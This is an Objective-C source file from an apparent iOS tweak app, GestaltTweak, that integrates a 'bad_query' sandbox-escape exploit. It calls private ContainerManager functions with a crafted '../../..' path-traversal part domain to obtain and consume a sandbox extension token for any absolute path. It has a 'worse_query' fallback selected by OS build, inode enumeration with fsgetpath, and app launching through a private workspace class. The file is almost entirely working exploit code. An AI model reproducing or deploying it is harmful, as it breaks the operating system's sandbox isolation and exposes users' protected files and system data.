//
//  BadQueryBridge.m
//  GestaltTweak
//
//  Independent Objective-C integration of the query used by
//  https://github.com/forcequitOS/bad_query
//
//  Licensed under the MIT License. Portions derived from frs0n/GestaltEdit.
//

#import "BadQueryBridge.h"
#import "WorseQueryBridge.h"

#import <dlfcn.h>
#import <stdlib.h>
#import <string.h>
#import <sys/fsgetpath.h>
#import <sys/mount.h>
#import <sys/stat.h>
#import <sys/sysctl.h>
#import <xpc/xpc.h>
#import <objc/message.h>

static const uint64_t kBadQueryContainerClass = 13;
static const uint64_t kBadQueryPart = 3;
static const uint64_t kBadQueryFlags = 0x0000008000000000ULL;
static NSString * const kBadQueryIdentifier =
    @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kBadQueryTraversalPrefix = @"../../../../../../../..";

typedef void *(*BadQueryCreate)(void);
typedef void (*BadQuerySetU64)(void *, uint64_t);
typedef void (*BadQuerySetXPC)(void *, xpc_object_t);
typedef void (*BadQuerySetCString)(void *, const char *);
typedef void *(*BadQueryGetSingleResult)(void *);
typedef void (*BadQueryFree)(void *);
typedef char *(*BadQueryCopySandboxToken)(void *);
typedef int64_t (*BadQueryConsumeSandboxExtension)(const char *);
typedef int (*BadQueryReleaseSandboxExtension)(int64_t);

typedef struct {
    void *library;
    BadQueryCreate create;
    BadQuerySetU64 setClass;
    BadQuerySetXPC setGroupIdentifiers;
    BadQuerySetU64 setFlags;
    BadQuerySetU64 setPart;
    BadQuerySetCString setPartDomain;
    BadQueryGetSingleResult getSingleResult;
    BadQueryFree freeQuery;
    BadQueryCopySandboxToken copySandboxToken;
    BadQueryConsumeSandboxExtension consumeSandboxExtension;
    BadQueryReleaseSandboxExtension releaseSandboxExtension;
} BadQueryAPI;

static BadQueryAPI *BadQuerySharedAPI(void)
{
    static BadQueryAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.library = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;

#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(api.library, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(setPartDomain, "container_query_operation_set_part_domain");
        LOAD(getSingleResult, "container_query_get_single_result");
        LOAD(freeQuery, "container_query_free");
        LOAD(copySandboxToken, "container_copy_sandbox_token");
#undef LOAD
        api.consumeSandboxExtension = (BadQueryConsumeSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.releaseSandboxExtension = (BadQueryReleaseSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

BOOL BadQueryBridgeAvailable(void)
{
    BadQueryAPI *api = BadQuerySharedAPI();
    return api->library && api->create && api->setClass &&
        api->setGroupIdentifiers && api->setFlags && api->setPart &&
        api->setPartDomain && api->getSingleResult && api->freeQuery &&
        api->copySandboxToken && api->consumeSandboxExtension &&
        api->releaseSandboxExtension;
}

@interface BadQueryLease ()
@property(nonatomic, copy, readwrite) NSString *targetPath;
@property(nonatomic, readwrite, getter=isActive) BOOL active;
@end

@implementation BadQueryLease
{
    int64_t _sandboxHandle;
}

+ (instancetype)leaseForPath:(NSString *)path error:(NSString **)error
{
    if (!path.isAbsolutePath) {
        if (error) *error = @"bad_query requires an absolute target path";
        return nil;
    }
    if (!BadQueryBridgeAvailable()) {
        if (error) *error = @"bad_query ContainerManager API unavailable";
        return nil;
    }

    BadQueryAPI *api = BadQuerySharedAPI();
    void *query = api->create();
    if (!query) {
        if (error) *error = @"bad_query could not create a container query";
        return nil;
    }

    api->setClass(query, kBadQueryContainerClass);
    xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
    api->setGroupIdentifiers(query, identifier);
#if !OS_OBJECT_USE_OBJC
    xpc_release(identifier);
#endif
    api->setPart(query, kBadQueryPart);
    NSString *partDomain = [kBadQueryTraversalPrefix stringByAppendingString:path];
    api->setPartDomain(query, partDomain.fileSystemRepresentation);
    api->setFlags(query, kBadQueryFlags);

    void *result = api->getSingleResult(query);
    if (!result) {
        api->freeQuery(query);
        if (error) *error = @"bad_query was rejected by ContainerManager";
        return nil;
    }

    char *token = api->copySandboxToken(result);
    if (!token) {
        api->freeQuery(query);
        if (error) *error = @"bad_query did not receive a sandbox token";
        return nil;
    }

    int64_t handle = api->consumeSandboxExtension(token);
    free(token);
    api->freeQuery(query);
    if (handle < 0) {
        if (error) *error = @"bad_query could not consume the sandbox token";
        return nil;
    }

    BadQueryLease *lease = [BadQueryLease new];
    lease->_sandboxHandle = handle;
    lease.targetPath = path;
    lease.active = YES;
    if (error) *error = nil;
    return lease;
}

+ (instancetype)leaseForPathUsingWorseQuery:(NSString *)path
                                   appGroup:(nullable NSString *)appGroup
                                      error:(NSString **)error
{
    WorseQueryLease *wqLease = [WorseQueryLease leaseForPath:path appGroup:appGroup error:error];
    if (!wqLease) return nil;

    BadQueryLease *lease = [BadQueryLease new];
    lease->_sandboxHandle = wqLease.handle;
    lease.targetPath = path;
    lease.active = YES;
    return lease;
}

- (void)invalidate
{
    if (!self.active) return;
    BadQueryAPI *api = BadQuerySharedAPI();
    if (api && api->releaseSandboxExtension) {
        api->releaseSandboxExtension(_sandboxHandle);
    } else {
        worse_query_release(_sandboxHandle);
    }
    _sandboxHandle = -1;
    self.active = NO;
}

- (void)dealloc
{
    [self invalidate];
}

@end

BadQueryLease *GTLeaseForPath(NSString *path, NSString **error)
{
    NSString *method = [[NSUserDefaults standardUserDefaults] stringForKey:@"method"];
    if (!method || method.length == 0) {
        size_t length = 0;
        char buildBuf[64] = {0};
        length = sizeof(buildBuf);
        if (sysctlbyname("kern.osversion", buildBuf, &length, NULL, 0) == 0) {
            NSString *build = [NSString stringWithUTF8String:buildBuf];
            if ([build isEqualToString:@"24A446"] || [build isEqualToString:@"24B119"]) {
                method = @"worse_query";
            }
        }
    }
    if ([method isEqualToString:@"worse_query"]) {
        NSString *group = [[NSUserDefaults standardUserDefaults] stringForKey:@"worse_query_app_group"];
        return [BadQueryLease leaseForPathUsingWorseQuery:path appGroup:group error:error];
    }
    return [BadQueryLease leaseForPath:path error:error];
}

NSArray<NSString *> *GTListContainers(NSString *path, int64_t max_inode)
{
    struct statfs sfs;
    if (statfs(path.UTF8String, &sfs) != 0) {
        if (statfs("/private/var", &sfs) != 0 && statfs("/var", &sfs) != 0) {
            return nil;
        }
    }
    fsid_t fsid = sfs.f_fsid;

    size_t path_length = strlen(path.UTF8String);
    char buf[1200];
    NSMutableArray<NSString *> *result = [NSMutableArray array];

    for (uint64_t ino = 1; ino <= (uint64_t)max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;

        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path.UTF8String, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;

        [result addObject:@(p)];
    }
    return result;
}

BOOL GTLaunchApplication(NSString *bundleID)
{
    if (bundleID.length == 0) return NO;

    Class workspaceClass = NSClassFromString(@"LSApplicationWorkspace");
    if (!workspaceClass) return NO;

    SEL defaultSelector = NSSelectorFromString(@"defaultWorkspace");
    if (![workspaceClass respondsToSelector:defaultSelector]) return NO;
    id workspace = ((id (*)(id, SEL))objc_msgSend)(workspaceClass, defaultSelector);
    if (!workspace) return NO;

    SEL openSelector = NSSelectorFromString(@"openApplicationWithBundleID:");
    if (![workspace respondsToSelector:openSelector]) return NO;
    [workspace performSelector:openSelector withObject:bundleID];
    return YES;
}